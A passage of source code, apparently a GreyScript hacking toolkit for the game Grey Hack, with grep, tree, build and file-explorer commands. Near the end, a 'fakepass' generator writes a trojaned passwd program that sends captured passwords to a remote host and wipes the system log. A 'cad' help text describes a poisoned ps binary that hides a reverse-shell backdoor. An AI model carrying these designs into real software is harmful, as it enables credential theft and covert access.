				gp(grep_tar, f, use_re, findfile)
			end for
		end if
		if t_f.is_binary or findfile == true then return
		buf = t_f.get_content
		if buf == "" or buf == null then return
		lines = buf.split(char(10))
		for line in lines
			words = line.split(" ")
			for word in words
				if use_re == true then
					if re.match(grep_tar.values, word.values) then 
						gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
					end if
				else
					if word == grep_tar or word.indexOf(grep_tar) >= 0 then 
						gresult.push(colorLightBlue+"Found: "+CT+colorWhite+word+CT+colorLightBlue+" on line "+lines.indexOf(line)+" word "+words.indexOf(word)+" in file: "+ t_f.path + CT)
					end if
				end if
			end for
		end for
  	end function
	
	greppy = {}
	greppy.grepped = []
	output = "No "+a1+" found."
	t_f = null // target file or folder
	grep_tar = a1.trim
	invoke_regex = false
	special_chars = ["*","^","$","#"] // * changed to #, . changed to *
	for special in special_chars
		if grep_tar.indexOf(special) >= 0 then invoke_regex = true
	end for
  	if not a2 then a2 = "/"
	tf_path = a2
	if typeof(tf_path) == "string" then
		t_f = globals.get_file(tf_path)
		if not t_f then return "grep: "+a2+" not found."
	end if
	// piped object handling. Unused if run as standalone but if baked into your own script, pipe objects to grep them.
	if typeof(tf_path) == "file" then t_f = tf_path
	if typeof(tf_path) == "computer" then t_f = tf_path.File("/")
	if typeof(tf_path) == "shell" then t_f = tf_path.host_computer.File("/")
	if typeof(t_f) != "file" then return "grep: "+a2+": unkown type."
	// end piped object handling.
	if DEBUG then print "debug: gresult is: "+gresult
	gp(grep_tar, t_f, invoke_regex, find_file)///////////////////////////////fire away!
  	if DEBUG then print "debug: ggf: "+greppy.grepped.join(char(10))//typeof(globals.grepped_file)
  	if globals.grepped_file then 
		//ggf = globals.grepped_file
		ggf = greppy.grepped[0]
		if a1 == "-F" or a1 == "-Fa" or a1 == "-Fn" or a1 == "-Fp" then ggf = greppy.grepped[-1]
		globals.grepped_file = null
		if return_name then return ggf.name // change this to greppy.grepped_file
		if return_path then return ggf.path
		if return_list then return greppy.grepped
 	 	return ggf
	end if
	if gresult != [] then output = gresult.join(char(10))
	return output
end function
command.tree = function(arg1, arg2=0, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then return "<b><u>tree || list files || file grep"+char(10)+
	"Usage: <b>tree</b> -- view filesystem tree (from / if no argument)"+char(10)+
	"Usage: tree [path|object] -- view filesystem from path down"+char(10)+
	"Usage: tree [opt: path(string)|object(object)] [opt: grep_target(string)] [quiet: 1|0] [opt: r|y|n]"+char(10)+
	"-- [path] - path to descend"+char(10)+
	"-- [object] - shell or computer: descends from / on object"+char(10)+
	"-- [object] - file: descends from path of file object on said object"+char(10)+
	"-- [grep_target] - search for target file by name"+char(10)+
	"---- matches exact name (no regex)"+char(10)+
	"---- <b>returns the file as an object if found</b>"+char(10)+
	"-- [1|0] -  1 = quiet, supress output"+char(10)+
	"-- [1|0] -  0 = verbose, print output"+char(10)+
	"-- [r|n|y] - r = send to t_buf, n = ignore, y = decipher (default is <b>r</b>)"+char(10)+
	"---- this option determines where bank.txt, mail.txt, passwd, and others are stored when encountered"+char(10)+
	"---- see command.clipa|b|c for more (ie <b>clipb -h</b>)"+char(10)+
	"-- e.g:<b> tree / database.csv 1 N | file -b</b> "+char(10)+
	"---- find database.csv on filesystem, display properties, pipe to BUFFER"+char(10)+
	"N.B. You may use @a, @b, @c or @clipa, @clipb, @clipc to reference [object]"+char(10)+
	colorGreen+"-- -- -- -- -- --"+char(10)+
	"<b>New: tree -f [path|object] [opt: 1|0 ]"+char(10)+
	"-- tree a directory or object and enumerate all files "+char(10)+
	"-- omitting path|object, and opt defaults to the / path"+char(10)+
	"-- [opt: 1] - quiet mode; suppress output."+char(10)+
	"-- [opt: 0] - print output; default"+char(10)+
	"---- omitting this option will default to printing output"+char(10)+
	"-- enumerates to the enum buffer"+char(10)+
	"---- see <b>enum -h</b> for instructions on how to use it"+char(10)+
	"- - - - - - - - - - - - - - - - - - - <b>details</b> - - - - - - - - - - - - - - - - - - - "+char(10)+
	"Usage: tree -f [path] -- trees from path, enumerates file objects to enum, prints output"+char(10)+
	"-- returns string"+char(10)+
	"Usage: tree -f [object] -- trees from object's <b>/</b> directory, enumerates, prints output"+char(10)+
	"-- returns string"+char(10)+
	"Usage: tree -f [path|object] [1]-- performs as above but does <b>not</b> print output"+char(10)+
	"-- returns 0"+char(10)+
	"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - "+char(10)+
	"Usage: tree -r [path|object] -- trees from path or object's '/' dir "+char(10)+
	"-- returns output as a <b>list</b> of file objects"+char(10)+
	"-- does not print filesystem output"+char(10)+
	"-- does not enumerate output"
	tem = null
	use_new_tree = false
	return_list = false
	if arg1 == "-f" or arg1 == "-fr" or arg1 == "-rf" or arg1 == "-r" then 
		use_new_tree = true 
		// new tree stuff goes here
		if arg1 == "fr" or arg1 == "-rf" or arg1 == "-r" then 
			return_list = true
			arg3 = "2"
		end if
		arg1 = arg2 
		arg2 = arg3 
		arg3 = arg4 
	end if 
	if arg1 then
		if arg1 == "@clipa" or arg1 == "@a" then arg1 = globals.CLIP["a"]
		if arg1 == "@clipb" or arg1 == "@b" then arg1 = globals.CLIP["b"]
		if arg1 == "@clipc" or arg1 == "@c" then arg1 = globals.CLIP["c"]
		if typeof(arg1) == "string" then tem = globals.get_file(arg1)
		if typeof(arg1) == "shell" or typeof(arg1) == "ftpshell" then tem = arg1.host_computer.File("/")
		if typeof(arg1) == "computer" then tem = arg1.File("/")
		if typeof(arg1) == "file" then tem = arg1
	else
		tem = localmachine.File("/")
	end if
	if not tem or not p_validate(tem,"size") then return "tree: invalid path or file"
	if arg3 == "0" then arg3 = 0
	if use_new_tree == true then return globals.newtree(tem,arg2)
	globals.grepped_file = null
	globals.list_files(tem, arg2, arg3, arg4)
	if arg2 and globals.grepped_file and globals.grepped_file.name == arg2 then return globals.grepped_file
	return 0
end function
command.makfit = function(arg1, arg2, arg3=0, arg4=0)
	if not arg1 or not arg2 or arg1 == "help" or arg1 == "-h" then return "<u>File Compression || File Size || MAKFIT</u>"+char(10)+
	"Make it fit file compression tool by Plu70"+char(10)+
	"File sizes are (mostly) determined by name. This tool will"+char(10)+
	"-- build files with different names until at or below the desired size."+char(10)+
	"-- if the -n option is used, no input file is used"+char(10)+
	"---- instead a dummy file is used and saved as the discovered name"+char(10)+char(10)+
	"<b>Usage: makfit [/path.src] [target_size_in_bytes] [opt: -A --include uppercase]"+char(10)+
	"-- target size in bytes determines ceiling for acceptable file size"+char(10)+
	"---- min 120000, max unlimited however it is unlikely to see > 10MB"+char(10)+
	"-- will change the file's name back to the name of the .src when done"+char(10)+
	"-- builds to size and outputs to parent path of .src file."+char(10)+
	"Extra: makfit [-n] [target_size_in_bytes] [opt:-A] -- do not use a source file "+char(10)+
	"-- final filename may be used when compiling any script"+char(10)+
	"-- this allows you to find a filename without supplying a source file."+char(10)+
	"Note: when successful makfit will return the compressed file as an object."+char(10)+
	"Usage Example:"+char(10)+
	"|> poke my.src | scribus | makfit my.src 150000 | run"
	no_source = false
	source = "print(""Hellow World"")"
	time_start = time
	source_path = arg1
	SIZE = arg2.to_int
	if DEBUG then print("current path: "+ currentPath)
	out_path = currentPath
	out_file = null
	source_file = null
	temp_path = currentPath
	if source_path.lower != "-n" then 
		source_file = globals.get_file(source_path)
		if not source_file then return "makfit: could not find file: "+source_path
		if source_file.is_binary then return "makfit: expected text file, got binary."
		temp_path = source_file.parent.path	
		if source_file.has_permission("r") then source = source_file.get_content else return "makfit: cannot read source file. Permission denied."
		if DEBUG then print("Read: "+source.len+" bytes from source file.")
	end if
	og_name = arg1
	if typeof(source_file) == "file" then og_name = source_file.name
	if og_name == "-n" then
		no_source = true
		og_name = "probe.src"
		if currentPath != "/" then source_path = currentPath+"/"+og_name else source_path = og_name
		print("makfit: running in sourceless mode"+char(10)+"Creating dummy file: probe.src")
	 	command.poke(source_path)
		print("Securing system.")
		command.perms("lock","all")
	end if
	print(colorLightBlue+"Building "+CT+colorWhite+ og_name +CT+colorLightBlue+" to file size <= " +CT+colorWhite+ SIZE +CT+colorLightBlue+" bytes. "+CT)
	og_name = og_name.split("\.")[0]
	if DEBUG then print("og_name: "+og_name)
	print("<align=center>"+char(3675)+"</align>")
	last_size = (SIZE + 1000)
	last_name = ""
	new_name = function(int)
		nm = []
		r = range("a".code,"z".code)
		if arg3 == "-A" then
			R = range("A".code, "Z".code) // it is somehow faster (for me) with this commented out. ymmv
			r = r + R											// i get about 45 sec avg with lowercase and 100 sec avg with upper+lower
		end if
		for loop in range(0, int)
			r.shuffle
			nm.push(char(r[0]))
		end for
		nm.push(".")
		r.shuffle
		nm.push(r[0])
		nm = nm.join("")
		return nm
	end function
	//
	i = 0
	l = 1
	while last_size > SIZE
		i = i + 1
		if i >= 50 then
			l = l + 1
			i = 1
		end if
		n = new_name(l)
		catch = localmachine.touch(temp_path, n+".src") // create the temp source file
		if DEBUG then print("attempted to create "+temp_path+ " + "+ n +".src"+char(10)+"Result: "+catch)
		if catch == "Can't compile. Source code is empty" then return catch
		out_path = temp_path+n
		if temp_path != "/" then out_path = temp_path+"/"+n
		if DEBUG then print("out_path: "+out_path)
		temp = globals.get_file(out_path+".src")
		if not temp then return "makfit: error could not create tempfile"
		temp.set_content(source)                      // set it's content with the original source
		catch = shell.build(temp.path, temp_path)     // build it
		if DEBUG then print("attempted to build "+temp.path+char(10)+"Result: "+catch)
		//wait(1)
		out_file = null
		out_file = globals.get_file(out_path)
		if not out_file then return("makfit: error: "+out_path+" not found. build failed."+CT)
		last_size = out_file.size.to_int    // check it's size
		if out_file.size.to_int > SIZE then
			out_file.delete
			temp.delete
		end if
    wait(.1)
	end while
	//
	time_end = time
	print(colorLightBlue+"Compiled "+colorWhite+out_file.name+colorLightBlue+" to size: "+colorWhite+out_file.size+colorLightBlue+" bytes."+CT)
	print(colorLightBlue+"Process completed in "+colorOrange+ (time_end - time_start) +colorLightBlue+ " seconds."+CT)
	if arg1 != "-n" then
		print(colorLightBlue+out_file.path+" renamed to: ")
		re_name = ""
		if temp_path != "/" then temp_path = temp_path + "/"
		command.mv(out_file.path,temp_path+og_name)
		print("makfit: found filename:"+colorLightBlue+" "+out_file.name)
	end if
	print("makfit: compiled:<u>"+colorWhite+" "+out_file.path+" "+out_file.permissions+" </u></b></color>to<b> "+out_file.size+" bytes")
	//command.perms("lock","all") removed because this is bad
	print "makfit: remember to secure the new file(s)"+char(10)+"makfit: returning output file object..."
	return out_file
end function
command.make = function(arg1, arg2, arg3=0, arg4=0)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return "</u>Make || Build</u>"+char(10)+"Usage: make [/path/file.src] [/destination/folder] [bool_importable: true/false | 1/0]"+char(10)+"-- build the .src file and ouput to destination folder."+char(10)+"-- final file name will be input file name with .src stripped."+char(10)+"-- e.g.<b> make /root/src/5hell.src /bin </b>"+char(10)+"-- build 5hell.src into a binary and output to:<b> /bin/5hell</b>"+char(10)+"-- n.b. make requires the source file to have the .src extension."+char(10)+"-- importable code can be imported by other sources when building."+char(10)+"-- this allows you to build programs with more than 160 characters by importing multiple source files."
	pathSource = arg1
	if typeof(arg1) == "file" then arg1 = arg1.path
	if typeof(arg1) != "string" then return "make: invalid source path"
	programPath = arg2
	if typeof(programPath) == "file" then programPath = programPath.path 
	importableCode = null
	if not arg2 or typeof(arg2) != "string" then programPath = globals.currentPath
  	if arg3 and (arg3 == "true" or arg3 == "1") then importableCode = 1 else importableCode = 0
	fileSource = globals.get_file(pathSource)
	folderDest = globals.get_file(programPath)
	if not fileSource then return("build: can't find "+ pathSource)
	if not folderDest then return("build: can't find " + folderDest)
	output = shell.build(fileSource.path, folderDest.path, importableCode)
	if output.len == 0 then
		return("make: build successful")
	else
		return(output)
	end if
	return 0
end function

// felix file explorer by, Plu70
if DEBUG then print("<size=75%>loading felix.5pk...(13.584kb)</size>")
command.felix = function(arg1, arg2=0, arg3=0, arg4=0)
  if arg1 == "help" or arg1 == "-h" then return "Usage: felix -- file explorer v 0.2, (wip). Use arrow keys to navigate. Press / to manually type a path."+char(10)+"Advanced: felix [shell|computer|file] -- run felix on filesys of piped object."+char(10)+"e.g. clipb @B 1 | felix -- where BUFFER[1] contained a file, shell or computer."
  action = {}
  action.cursor = 0
  action.last = 0
  min = 0
  action.max = 0

  action.memory = null
  action.buffer = function(arg=null)
    if arg then action.memory = arg
    if not action.memory then return char(176)
    return action.memory.name
  end function
  action.b = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    globals.BUFFER.push(selected)
    conf = user_input("felix:<b> sent "+selected.name+" to BUFFER. Acces via memory_alpha.</b>"+char(10)+"press <<b>anyKey</b>> to continue",0,1)
    return inf
  end function
  action.get_selected = function(infile)
    folders = infile.get_folders
    files = infile.get_files
    contents = folders + files
    if contents.len == 0 then return 0
    if contents.hasIndex(action.cursor) then return contents[action.cursor] else return 0
  end function
  action.r = function(inf) //  remove
    selected = action.get_selected(inf)
    if not selected then return inf
    confirm = user_input("<b>delete</b> "+selected.path+"? [y/N] ||: ",0,1)
    if confirm.lower == "y" or confirm == "RightArrow" then
      check = selected.delete
      if check then print(check) else print("...deleted.")
    else
      print("aborting...")
    end if
    return inf
  end function
  action.z = function(f)
    if action.memory then action.memory = null
    return f
  end function
  action.x = function(inf)
    nf = action.get_selected(inf)
    if nf then action.buffer(nf)
    return inf
  end function
  action.v = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    if not action.memory then return inf
    dest = inf.path
    label = ""
    print("[0] abort "+char(10)+"[1] overwrite "+selected.name+char(10)+"[2] paste to "+inf.path)
    if selected.is_folder then print("[3] paste to "+selected.path)
    opt = user_input("(q=quit)||: ",0,1)
    if opt == "0" or opt.lower == "q" then return inf
    coop = user_input("[<b>0</b>] - Copy or [1] - Move (q=quit)||: ",0,1)
    if coop.lower == "q" then return inf
    if opt == "3" and selected.is_folder then
      dest = selected.path
      label = action.memory.name
      if coop.to_int == 1 then
        action.memory.move(dest, label)
      else
        action.memory.copy(dest, label)
      end if
      return inf
    end if
    if opt == "1" then
      label = selected.name
    else
      if opt == "2" then
        label = action.memory.name
      else
        return inf
      end if
    end if
    if coop.to_int == 1 then
      action.memory.move(dest, label)
    else
      action.memory.copy(dest, label)
    end if
    //action.memory = null
    return inf
  end function
  action.e = function(f)
    // poke, mkdir, rename
    return f
  end function
  action.f = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    print(command.file(selected))
    print(colorGreen+"<u>==================================</u>"+CT)
    wait_for = user_input("press <<b>anyKey</b>> to continue",0,1)
    return inf
  end function
  action.n = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    new_name = user_input("rename_"+selected.name+"(null=abort):> ")
    if new_name == "" or new_name == " " then return inf
    print(selected.rename(new_name))
    return inf
  end function
  action.d = function(inf)
    return action.RightArrow(inf)
  end function
  action.RightArrow = function(inf)
    selected = action.get_selected(inf)
    if not selected then return inf
    if selected.is_folder then // descend into folder
      inf = selected
      action.last = abs(action.cursor)
      action.cursor = 0
      return inf
    end if
    if selected.is_binary then // run prompt
		if selected.name.split("\.")[-1] != "so" then
			doit = user_input(colorWarning+"warning: launching can only be done via a shell object;"+char(10)+"-- if the file does not exist on the active shell;"+char(10)+"---- the launch will fail"+char(10)+"Launch: "+selected.name+" ["+colorWarning+"Y(or right arrow)"+CT+"/n] ||: ",0,1).lower
			if doit != "n" then
				if typeof(shell) == "ftpshell" then
					print("launch not available in ftpshell")
					return inf
				end if
				globals.stack_pool("up")
				try = shell.launch(selected.path, user_input("params for: "+char(10)+selected.path+" "))
				_cascade // exit if cascade
				globals.stack_pool("down")
				if try then print(try)
			end if
			return inf
		else
			if selected.path.split("/")[1] == "lib" then
				if user_input(colorWarning+"warning: databsing can only be done on the "+colorGreen+"launching shell"+char(10)+"-- it will not translate through glasspool"+char(10)+"Database this lib.so anyway? "+colorWarning+"Y"+CT+"/N] ||:",0,1).lower != "n" then
					if globals.metaxploit then command.db("-l", selected.name) else print colorError+"<b>error: metaxploit not loaded!"
				end if
				return inf
			else
				print(colorOrange+"Selected .so is not in /lib "+CT+char(10)+"aborting... ")
				return inf
			end if
		end if
    end if
    if selected.has_permission("r") then
      print(selected.get_content)
      pause = user_input(char(10)+"press <<b>anyKey</b>> to continue",0,1)
    end if
    return inf
  end function

  action.a = function(f)
    return action.LeftArrow(f)
  end function
  action.LeftArrow = function(f)
    if f.name != "/" then
      f = f.parent
      action.cursor = abs(action.last)
    end if
    return f
  end function

  action.w = function(f)
    return action.UpArrow(f)
  end function
  action.UpArrow = function(f)
    if action.cursor <= min then
      action.cursor = action.max
      return f
    end if
    action.cursor = action.cursor - 1
    return f
  end function

  action.s = function(f)
    return action.DownArrow(f)
  end function
  action.DownArrow = function(f)
    if action.cursor >= action.max then
      action.cursor = min
      return f
    end if
    action.cursor = action.cursor + 1
    return f
  end function

  action.f1 = function(f)
    print("-----")
    print("Navigation: [w][a][s][d] or ArrowKeys ")
    print("            [d] - rightArrow to: launch bin, open text, scan .so, descend dir")
    print("Manual  cd: [/] - type path stating with / ")
    print("               -- the [/] initiates manual entry ")
    print("Select:     [x] - selection buffer; sets item to copy from ")
    print("Paste:      [v] - performs a paste using selection buffer ")
    print("               -- to highlighted selection (opens context menu) ")
    print("Remove:     [r] - deletes file ")
    print("Unselect:   [z] - remove item from selection buffer ")
    print("Clr_scrn:   [c] - toggle clear screen or regular view ")
    print("File info:  [f] - get file info/properties for highlighted selection ")
    print("Buffit:     [b] - send highlighted selection to BUFFER ")
    print("Rename:     [n] - rename highlighted selection ")

    print("_____note: launching binaries via felix does NOT activate glasspool_____")
    print("-----")
    pause = user_input("press <<b>anyKey</b>> to continue",0,1)
    return f
  end function

  action.get = function(arg, afile)
    arg = arg.trim
    if arg != "DownArrow" and arg != "UpArrow" and arg != "LeftArrow" and arg != "RightArrow" then arg = arg.lower
    //print(arg)
    if action.hasIndex(arg) then
      a = @action[arg]
      return a(afile)
    else
      return afile
    end if
  end function

  action.branch = function(f, arg) // takes a file object
    file_object = f
    f_path = arg.split("/")
    if f_path[0] == "" then f_path[0] = "/"
    while file_object.name != "/"
      file_object = file_object.parent
    end while
    print("f_path: "+f_path) // debug
    print("arg: "+arg)       // debug
    while file_object.path != arg.trim
      globals.grepped_file = null
      globals.list_files(file_object, f_path.pull, 1,"N") // requires 5hell or 5hell.so
      if globals.grepped_file then file_object = globals.grepped_file else return f
    end while
    return file_object
  end function

  path_contents = function(f,clr)
	if DEBUG then print "debug: in path_contents"
    folders = f.get_folders
    files = f.get_files
    contents = folders + files
    action.max = contents.len - 1
    output = f.permissions+" "+f.owner+" "+f.group+" "+f.size+" "+char(1068)+"["+f.is_binary+"] "+f.path + char(10) + char(166) + " [ " + action.buffer + " ]"
    i = 0
    get = ""
    c_put = ""
    for c in contents
      c_put = c.permissions+" "+c.owner+" "+c.group+" "+c.size+" "+char(1068)+"["+c.is_binary+"] "+c.name
      output = output+char(10)+c_put
      if i == action.cursor then
        get = c.name
        if get == null then get = ""
      end if
      i = i + 1
    end for
    //if get then print( format_columns(output).replace(get,colorOrange+get+CT).replace(".src",colorCyan+".src"+CT).replace(".exe",colorRed+".exe"+CT).replace(".txt",colorWhite+".txt"+CT).replace(".log",colorLightBlue+".log"+CT).replace(".jpg",colorLightBlue+"</b>.jpg</color>").replace(".so",colorGold+"</b>.so</color>").replace(".html",colorCyan+".html"+CT) ) else print(format_columns(output))
	if clr < 1 then clr = 0 else clr = 1
	if get then print( format_columns(output).replace(get,colorOrange+get+CT),clr ) else print(format_columns(output),clr)
    return
  end function

  ////BEGIN MAINish
  felix = function(file)
    currentPath = file.path
    contents = file.get_folders + file.get_files
    action.max = contents.len - 1
    CLEAR = -1
    while true
      if CLEAR > 0 then button_c = "<b>C</b>" else button_c = "<b>c</b>"
      path_contents(file,CLEAR)
      print(colorLightBlue+currentPath+CT)
      print("[F1] help [w][a][s][d] == [^][<][v][>] [q] quit")
      print("[z] clr slct [x] select [v] paste [f] file [n] rename ")
      input = user_input("["+button_c+"] tog clrs [r] remove [b] buffit ||: ",0,1)
      print
      if input.lower == "c" then
        CLEAR = (CLEAR * (-1)) //  flipbit
        continue
      end if
      if input.lower == "q" then return "Goodbye."
      if input == "/" then
        input = input + user_input(input,0,0)
        file = action.branch(file, input)
        currentPath = file.path
        continue
      end if
      file = action.get(input, file)
      currentPath = file.path
    end while
    return 0
  end function
  /// END MAINish
  init = function(file_object)
    print(colorOrange+"Felix file explorer v 1.1 by Plu70"+CT)
    print(colorLightBlue+"-----------------------------------------"+CT)
    while file_object.name != "/"
      file_object = file_object.parent
    end while
    return felix(file_object)
  end function
  if DEBUG then print "debug: felix: initializing"
  if typeof(arg1) == "shell" then return init(arg1.host_computer.File("/"))
  if typeof(arg1) == "computer" then return init(arg1.File("/"))
  if typeof(arg1) == "file" then return init(arg1)
  return init(localmachine.File("/"))
end function

command.file = function(arg1, arg2=0, arg3=0, arg4=0)
	if not arg1 or arg1 == "help" or arg1 == "-h" then return colorGreen+"File || File Properties || Inspect File"+char(10)+
	colorGreen+"<u>================================"+char(10)+
	"Usage: <b>file [opt:-l|-c|-b|-r|-n|-p] [/path|file_object] [opt:shell|computer|file]</b>"+char(10)+
		" File shows the properties information for the given file "+char(10)+
		"and takes path or file_object and returns file information as a stirng."+char(10)+char(10)+
		"Usage: file [opt] [/path] -- return information about the file at /path"+char(10)+
		"UsagE: file [opt] [object] -- return onformation about the file object"+char(10)+
		"Usage: file [opt] [/path] [object] -- return file info for file at path on object"+char(10)+
		"-- computer and shell objects: relative paths use present working directory"+char(10)+
		"-- file objects: must use absolute path"+char(10)+
		"-- file objects: will be searched from  the <b>/</b> directory"+char(10)+
		"Advanced: file [opt] [f_object] [object] -- will still return info of f_object; object is ignored"+char(10)+
		"Usage: "+char(10)+
		"-- file [<color=white>-l</color>] [path|object] [opt:object] -- return number of lines in the file as a string"+char(10)+
		"-- file [<color=white>-c</color>] [path|object] [opt:object] -- return number of chars in the file as a string"+char(10)+
		"-- file [<color=white>-s</color>] [path|object] [opt:object] -- return size of the file as a string"+char(10)+
		"-- file [<color=white>-b</color>] [path|object] [opt:object] -- send file to BUFFER (and display file info)"+char(10)+
		"---- also returns the file as an object"+char(10)+
		"---- eg: "+colorLightBlue+"</b>grep <b>-f</b> *#.log$ /var | file -b"+char(10)+
		"-- file [<color=white>-r</color>] [path|object] [opt:object] -- return the file as an object"+char(10)+
		"-- file [<color=white>-n</color>] [path|object] [opt:object] -- return the name of file "+char(10)+
		"-- file [<color=white>-p</color>] [path|object] [opt:object] -- return the path of file"+char(10)+
		"- - - - - - - - - - - - - - - - - -"+char(10)+
		"---- eg: <b></b>clipb @B [#] | file -p </b>-- return the path of the piped file object"+char(10)+
		"---- eg: <b>file [opt] [path|file] [shell|computer]</b> -- run file on the remote object instead of locally"
  	get_lines = false
	get_chars = false
  	to_buffer = false
	return_name = false
	return_path = false
	return_file = false
	return_size = false 

	if arg1.indexOf("-") >= 0 then //== "-l" or arg1 == "-c" or arg1 == "-b" then
		if arg1 == "-r" then return_file = true
		if arg1 == "-l" then get_lines = true
		if arg1 == "-c" then get_chars = true
    	if arg1 == "-b" then 
			to_buffer = true
			return_file = true 
		end if
		if arg1 == "-n" then return_name = true
		if arg1 == "-p" then return_path = true
		if arg1 == "-s" then return_size = true
		if arg2 then arg1 = arg2 else return "file: missing path or object: file [opt] [thing] [opt:thing]"
		if arg3 then arg2 = arg3
		if arg4 then arg3 = arg4
	end if
	if typeof(arg1) == "string" then
		file = null
		// backup og computer
		comp_stor = globals.localmachine
		// swap em if you got em
		if arg2 and typeof(arg2) == "shell" then globals.localmachine = arg2.host_computer
		if arg2 and typeof(arg2) == "computer" then globals.localmachine = arg2
		// find our file somewhere
		if arg2 and typeof(arg2) == "file" then
			while arg2.name != "/"
				arg2 = arg2.parent 
			end while
			file_list = globals.newtree(arg2,"2")
			if file_list then
				for f in file_list
					if f.path == arg1 then file == f 
				end for
			end if			
		else
			file = globals.get_file(arg1)
		end if
		// restore og computer
		globals.localmachine = comp_stor
		// complain if needed
		if not file or typeof(file) != "file" then return "file: "+arg1+" not found."
		arg1 = file
	end if
	if typeof(arg1) == "file" then
		if return_path then return arg1.path
		if return_name then return arg1.name
    	imp_stat = null
		if DEBUG then print "checking for symlink"
		sym_stat = null 
		sym_stat = arg1.is_symlink
		if sym_stat then 
			sym_stat = "yes"+char(10)+"parent: "+arg1.parent.path
			imp_stat = "symlink"
		else 
			sym_stat = "no"
		end if
		if DEBUG then print "checking import status (except symlinks)"
		imp_stat = arg1.allow_import
		if imp_stat != "symlink" then 
			if imp_stat then imp_stat = "yes" else imp_stat = "no"
		end if
		if DEBUG then print "status: "+imp_stat
  		file_id_info = ["name: "+arg1.name, "path: "+arg1.path, "size: "+arg1.size, "owner: "+arg1.owner, "group: "+arg1.group, "perms: "+arg1.permissions] 
		if arg1.is_folder then
			if DEBUG then print "debug: is_folder"
			file_id_info.push("type: folder")
			conts = arg1.get_folders.len + arg1.get_files.len
			if DEBUG then print "subs: "+conts
			file_id_info.push("subs: "+conts)
		else
			if arg1.is_binary then
				if DEBUG then print "debug: is_binary"
				file_id_info.push("type: binary")
				file_id_info.push("import: "+imp_stat)
			else
				if DEBUG then print "debug: is_text"
				file_id_info.push("type: ascii")
				lines = 0
				chars = 0
				if arg1.get_content then
					lines = arg1.get_content.split(char(10)).len
					chars = arg1.get_content.values.len
				end if
				file_id_info.push("lines: "+str(lines))
				file_id_info.push("chars: "+str(chars))
			end if
		end if
		file_id_info.push("symlnk: "+sym_stat)
		if return_size == true then 
			//print "file: returning file size..."
			return arg1.size
		end if
		if to_buffer then
			globals.BUFFER.push(arg1)
			print "file: <b>"+arg1.name+"</b> sent to <b><color=orange>BUFFER</b>"
			return format_columns(file_id_info.join(char(10)))
		end if
		if return_file then 
			print "file: returning object for: "+arg1.path
			return arg1
		end if
		if get_lines then
			if file_id_info.indexOf("type: binary") == null then return str(lines) else return "file: "+arg1.path+" is binary"
		end if
		if get_chars then
			if file_id_info.indexOf("type: binary") == null then return str(chars) else return "file: "+arg1.path+" is binary"
		end if
    	print(colorGreen+"<u>==================================</u>"+CT)
		return format_columns(file_id_info.join(char(10)))
	end if
	return "file: unknown error"
end function
command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
    if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
    ip = arg1
    p = arg2
    if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
    if ip == """"+""+"""" then return "aborting..."
    if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
    if p == """"+""+"""" then return "aborting..."
    passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
    rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
    scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
    final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
    fp = passwd + rem_c + scrub + final
    localmachine.touch(currentPath, "passwd.src")
    source = globals.get_file("passwd.src")
    print("FakePass v 0.2, by Plu70")
    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
    if not source then return "write error: unable to create passwd.src in "+currentPath
    source.set_content(fp)
    wait(1)
    print(source.get_content)
    print
    saved = "password.src"
    if currentPath != "/" then saved = "/password.src"
    print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
    return 0
end function
command.cad = function(add=0, pt=0, arg3=0, arg4=0)
    if add == "help" or add == "-h" then return colorRed+"cad:</b> cloak and dagger protocol"+char(10)+
	"Usage: cad [optional: ip ] [optional: port] -- create a poisoned ps.src that hides itself"+char(10)+
	"-- prompts for ip if not passed"+char(10)+
	"-- defaults to port 1222 if not passed"+char(10)+
	"-- creates the file "+colorRed+"ps.src"+CT+" in the current path "+char(10)+
	"-- it <b>does not build</b> the file; review first, then build"+char(10)+
	"-- ps.src contains code for a poisoned <b>ps</b> binary"+char(10)+char(10)+
	"** Review ps.src and build with make or makfit into <b>/bin/ps"+char(10)+
	"** Remove the .src, "+char(10)+
	"*** optionally run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+
	"*** or leave it in place and wait for the target to run it"+char(10)+
	"*** if they do, and metaxploit.so isn't present, it will just act like normal ps"+char(10)+
	"*** if metaxploit is present, a reverse shell will be dropped, named ps"+char(10)+
	"*** the poisoned ps binary will hide this back door"+char(10)+
	"***** beware! using plain old ...host_computer.show_procs will reveal the trick!"+char(10)+
	"The result is a hidden backdoor / trojan on the target. Use with care."+char(10)+
	"n.b. you get bonus points for extending the code to be even more nefarious"
